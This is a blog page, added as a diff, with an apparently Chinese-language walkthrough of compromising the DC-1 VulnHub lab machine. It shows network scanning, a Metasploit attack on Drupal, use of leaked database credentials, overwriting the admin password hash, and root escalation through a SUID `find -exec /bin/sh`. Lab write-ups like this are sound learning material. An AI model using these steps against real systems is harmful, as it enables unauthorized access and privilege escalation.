@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>DC-1靶机完全渗透 | zJ4sun</title>
+<meta name="description" content="行胜于言">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://zj4sun.github.io//favicon.ico?v=1735599266098">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://zj4sun.github.io//styles/main.css">
+
+
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://zj4sun.github.io/">zJ4sun</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>DC-1靶机完全渗透</h1>
+            <p class="article-meta">
+              2024-04-28
+              
+                <a href="https://zj4sun.github.io/tag/1Wpns8h4a/" class="badge secondary">
+                  vulnhub打靶
+                </a>
+              
+            </p>
+            
+            <div class="post-content" v-pre>
+              <h2 id="前言">前言：</h2>
+<p>关于Vulnhub:Vulnhub是一个特别好的渗透测试实战网站，提供了许多带有漏洞的渗透测试靶机下载。https://www.vulnhub.com/<br>
+根据Vulnhub的要求是要拿到root权限和5个flag，有了大体思路。</p>
+<p>靶机下载地址：https://www.vulnhub.com/entry/dc-1-1,292/<br>
+靶机难度：入门<br>
+靶机描述：DC-1 是一个特意建造的易受攻击的实验室，目的是在渗透测试领域获得经验。它旨在为初学者带来挑战，但它的难易程度取决于您的技能和知识以及您的学习能力。<br>
+目标：拿到root权限和找出5个flag<br>
+环境搭建：</p>
+<p>将靶机下载下来后，用vm打开，攻击机机使用kali</p>
+<h2 id="流程">流程：</h2>
+<p>开始卡在登录口了， 看了发现登录密码，那应该是需要自己去找账号密码。</p>
+<figure data-type="image" tabindex="1"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403281402510.png" alt="image-20240328140230277" loading="lazy"></figure>
+<h2 id="信息收集">信息收集</h2>
+<p>先找出目标主机的ip。我们 使用arp-scan进行内网扫描：</p>
+<pre><code>arp-scan -l
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:a0:77:07, IPv4: 192.168.80.133
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.80.1    00:50:56:c0:00:08       VMware, Inc.
+192.168.80.2    00:50:56:f1:e5:e3       VMware, Inc.
+192.168.80.128  00:0c:29:3f:47:5f       VMware, Inc.
+192.168.80.254  00:50:56:f0:21:5f       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 2.067 seconds (123.85 hosts/sec). 4 responded
+</code></pre>
+<p>再使用masscan进行内网扫描：</p>
+<pre><code>masscan --ping 192.168.80.0/24    
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-03-28 06:16:11 GMT
+Initiating ICMP Echo Scan
+Scanning 256 hosts
+Discovered open port 0/icmp on 192.168.80.128                                  
+Discovered open port 0/icmp on 192.168.80.2    
+</code></pre>
+<p>使用masscan对目标<code>192.168.80.128</code>进行端口扫描：</p>
+<pre><code>masscan 192.168.80.128 -p0-65535 --rate=10000  
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-03-28 06:20:45 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65536 ports/host]
+Discovered open port 35396/tcp on 192.168.80.128                               
+Discovered open port 111/tcp on 192.168.80.128                                 
+Discovered open port 22/tcp on 192.168.80.128                                  
+Discovered open port 80/tcp on 192.168.80.128                                  
+rate:  0.00-kpps, 100.00% done, waiting -3-secs, found=4 
+</code></pre>
+<p>使用nmap对开放的端口进行更详细的端口信息扫描：</p>
+<pre><code>nmap -sS -sV -A -T5 -p- 192.168.80.128
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-28 02:25 EDT
+Nmap scan report for 192.168.80.128
+Host is up (0.00053s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
+|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
+|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
+80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
+|_http-server-header: Apache/2.2.22 (Debian)
+|_http-generator: Drupal 7 (http://drupal.org)
+|_http-title: Welcome to Drupal Site | Drupal Site
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          35396/tcp   status
+|   100024  1          52557/tcp6  status
+|   100024  1          54151/udp   status
+|_  100024  1          58961/udp6  status
+35396/tcp open  status  1 (RPC #100024)
+MAC Address: 00:0C:29:3F:47:5F (VMware)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.2 - 3.16
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.53 ms 192.168.80.128
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.55 seconds
+
+</code></pre>
+<p>发现了80，22端口访问一下</p>
+<figure data-type="image" tabindex="2"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403281429944.png" alt="image-20240328142946753" loading="lazy"></figure>
+<p>搜了下这个Drupal，发现存在很多漏洞，想着使用MSF开始漏洞利用<br>
+先搜索MSF中的漏洞模块</p>
+<figure data-type="image" tabindex="3"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403281434729.png" alt="image-20240328143403565" loading="lazy"></figure>
+<p>发现好多攻击模块找个比较新一点和比较高危的试了试，这里需要借助之前网上搜到的漏洞资料结合，更准确的进行漏洞利用<br>
+因为显示有两个比较新的，尝试利用那个18年那个，但是我这边一直不能成功，后试了试每一个都不能成功过利用，上网查询相关的介绍发现，这里应该是能够直接利用成功的。那么到这里我怀疑我的msf出现了问题，我尝试更新到最新版本，再次尝试还是不能够成功利用。</p>
+<figure data-type="image" tabindex="4"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403281510304.png" alt="image-20240328151054182" loading="lazy"></figure>
+<p>几经搜索，发现了一个方法，先删除后重新安装</p>
+<pre><code>sudo apt-get remove --auto-remove metasploit-framework 
+sudo apt-get update
+apt install metasploit-framework 
+sudo service postgresql start
+sudo service metasploit start
+事实证明，这个方法不行，起码我的电脑不行，我重新安装的msf响应非常缓慢，搜索一一些解决办法都不能解决，几遍尝试后只好又将kali重装。
+</code></pre>
+<h2 id="攻击">攻击</h2>
+<figure data-type="image" tabindex="5"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403282308088.png" alt="image-20240328230815900" loading="lazy"></figure>
+<p>实在是没有绷住，重装的后的kali不经msf反应正常了，也可以连上了。</p>
+<p>getshell一下，拿到 <code>shell</code>，并通过 <code>python</code> 反弹 <code>bash</code>:</p>
+<pre><code>shell
+python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+# python反弹bash
+
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403290947667.png" alt="image-20240329094730632" loading="lazy"></figure>
+<p>此时我们已经拿到了 bash-shell</p>
+<figure data-type="image" tabindex="7"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403290943864.png" alt="image-20240329094327798" loading="lazy"></figure>
+<p>发现了flag1.txt</p>
+<h3 id="flag1">FLAG1</h3>
+<p>直接明文给出来了，直接翻阅即可：</p>
+<figure data-type="image" tabindex="8"><a href="https://s3.xiabee.cn/pic/2023/03/91d1bac7f04cb09031c5f1cc33b98247a2ab70a6d3e9c7c91bc87f771084b090.png"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403290949842.png" alt="image-20230321151011907" loading="lazy"></a></figure>
+<blockquote>
+<p>Every good CMS needs a config file - and so do you.</p>
+<p>flag1提示</p>
+</blockquote>
+<figure data-type="image" tabindex="9"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403290955236.png" alt="image-20240329095501190" loading="lazy"></figure>
+<p>我开始也不知道配置文件在那个地方，先看了网上的攻略，发现Drupal 的配置文件通常位于 Drupal 根目录下的 <code>sites/default</code> 目录中。具体来说，Drupal 7 的配置文件名为 <code>default.settings.php</code>，而 Drupal 8 和 9 的配置文件名为 <code>default.settings.php</code>。</p>
+<p>所以说前期信息收集一定要到位。</p>
+<figure data-type="image" tabindex="10"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403290957524.png" alt="image-20240329095724480" loading="lazy"></figure>
+<p>这里找到了flag2，同时发现了数据库</p>
+<h3 id="flag2">flag2</h3>
+<pre><code>* flag2
+ * Brute force and dictionary attacks aren't the
+ * only ways to gain access (and you WILL need access).
+ * What can you do with these credentials?
+
+</code></pre>
+<p>翻译一下就是暴力攻击也许不是唯一方式 同时我们看到了数据库的库名（drupaldb）、用户名（dbuser）和密码（R0ck3t），先记录下来，并通过这个用户登陆数据库</p>
+<pre><code>mysql -udbuser -pR0ck3t
+use drupaldb;
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403291037717.png" alt="image-20240329103715670" loading="lazy"></figure>
+<p>先试试user表，发现了加密后的密码</p>
+<figure data-type="image" tabindex="12"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403291041308.png" alt="image-20240329104117250" loading="lazy"></figure>
+<p>在回过来看看表名有没有什么特殊的</p>
+<figure data-type="image" tabindex="13"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403291044777.png" alt="image-20240329104441714" loading="lazy"></figure>
+<p>这里卡住了，看了几个表没有思路了，去看了下别人的教程，都说的试Drupal数据库中存储的密码散列由自带的password-hash.sh生成的，进入脚本目录<code>/var/www/</code>使用<code>php ./scripts/password-hash.sh admin</code>生成密码为admin的散列，在此之前需要生成DC-1的交互shell：</p>
+<pre><code>php ./scripts/password-hash.sh admin
+</code></pre>
+<p>登录 后更新一下数据库</p>
+<pre><code>ysql -udbuser -pR0ck3t
+# 进入数据库
+use drupaldb;
+# 使用 drupaldb 数据库
+update users set pass = '$S$DRX6M.nvrKxrvQvj4kef1/pbQR0FzL1paS4sStmNxlFhADzUxvRe' where name = 'admin';
+# 将密码改为123（记得）
+truncate flood;
+# 如果错误密码太多被锁定的话，这条语句可以解除锁定
+
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403291116576.png" alt="image-20240329111638511" loading="lazy"></figure>
+<p>更改后，访问网站登录</p>
+<figure data-type="image" tabindex="15"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403291234840.png" alt="image-20240329123424749" loading="lazy"></figure>
+<h3 id="flag3">flag3</h3>
+<p>Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.翻译下PERMS 将帮助查找密码 - 但您需要 -exec 该命令来找出如何获取shadow中的内容。根据提示查看shadow文件，发现flag4</p>
+<p>对于 &quot;Special PERMS will help FIND the passwd&quot; 这部分，它在提示我们去查找 passwd 文件，通常这个文件位于 Unix/Linux 系统中的 <code>/etc</code> 目录下，用来存储用户账户信息。然后，&quot;but you’ll need to -exec that command to work out how to get what’s in the shadow&quot; 这部分则是在暗示我们需要执行一个命令来处理 <code>/etc/passwd</code> 文件中的内容，以便获取 shadow 文件中的信息。</p>
+<p>在 Unix/Linux 系统中，<code>/etc/passwd</code> 文件存储了系统用户的基本信息，而 <code>/etc/shadow</code> 文件则存储了加密后的用户密码。通常情况下，<code>/etc/shadow</code> 文件的权限设置为只有 root 用户可读，所以如果你想要查看其内容，可能需要以 root 权限来执行相应的命令。</p>
+<p>因此，通过使用 <code>find</code> 命令查找 passwd 文件，并使用 <code>-exec</code> 选项执行相应的命令，可以帮助我们进一步获取 shadow 文件中的信息。</p>
+<pre><code>find / -type f -perm -u=s 2&gt;/dev/null
+cat /etc/passwd
+
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403291249426.png" alt="image-20240329124928352" loading="lazy"></figure>
+<h3 id="flag4">flag4</h3>
+<pre><code>Can you use this same method to find or access the flag in root?
+
+Probably. But perhaps it's not that easy.  Or maybe it is?
+
+</code></pre>
+<p>查看这个提示，发现要root的权限，所以我们使用就需要进行提权</p>
+<pre><code>find / -exec &quot;/bin/sh&quot; \;
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403291407051.png" alt="image-20240329140748981" loading="lazy"></figure>
+<h3 id="flag5">flag5</h3>
+<pre><code>Well done!!!!
+
+Hopefully you've enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+
+</code></pre>
+<p>查看文件，发现最终flag！！！</p>
+<figure data-type="image" tabindex="18"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202403291412535.png" alt="image-20240329141206454" loading="lazy"></figure>
+<p>这是打的第一台vulnh靶机，也是第一次相对完整的渗透流程，明白了很多不足，希望后续能够学习更多知识点。</p>
+<h2 id="参考文章">参考文章</h2>
+<p><a href="https://blog.csdn.net/weixin_33345090/article/details/113563493">drupal mysql hash密码_【Drupal】如何重置Drupal 7的用户密码</a></p>
+<p><a href="https://blog.csdn.net/weixin_48991458/article/details/121362982">参考攻略</a></p>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://zj4sun.github.io/post/2024-nian-di-yi-ji-du-zong-jie/">
+                <h3 class="post-title">
+                  2024年第一季度总结
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://zj4sun.github.io//images/avatar.png?v=1735599266098" class="no-responsive avatar">
+    <div class="text-muted">行胜于言</div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/2024-nian-nian-zhong-zong-jie/">2024年年度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/wei-xie-qing-bao/">威胁情报</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/2024-nian-di-si-ji-du-zong-jie/">2024年第四季度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/ruo-kou-ling-zong-jie/">弱口令总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/2024-nian-di-san-ji-du-zong-jie/">2024年第三季度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/python-pa-chong-xue-xi-bi-ji/">python爬虫学习笔记</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/githubgridea-pei-zhi-ge-ren-bo-ke-wu-fa-jia-zai-maincss-wen-ti/">github+gridea配置个人博客无法加载main.css问题</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/2024-nian-di-er-ji-du-zong-jie/">2024年第二季度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/xuan-ji-ba-chang-apcahe-ri-zhi-fen-xi/">玄机靶场-apcahe日志分析</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/xuan-ji-ba-chang-linux-ri-zhi-fen-xi/">玄机靶场-Linux日志分析</a>
+            </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://zj4sun.github.io/tag/EjyP2cHMk/" class="badge success">
+          live生活
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/Mt6wUAkn1/" class="badge success">
+          quarter总结
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/zrEiWq5mHs/" class="badge secondary">
+          information研究
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/qXZ0OLIUJ/" class="badge secondary">
+          python脚册
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/EJT8wG8lz/" class="badge secondary">
+          setting环境设置
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/ApJiA0cW4/" class="badge secondary">
+          Emergency响应
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/ZtS9EorEb/" class="badge secondary">
+          web安全之路
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/4KkPHXGCg/" class="badge success">
+          job实习项目
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/1Wpns8h4a/" class="badge ">
+          vulnhub打靶
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://zj4sun.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
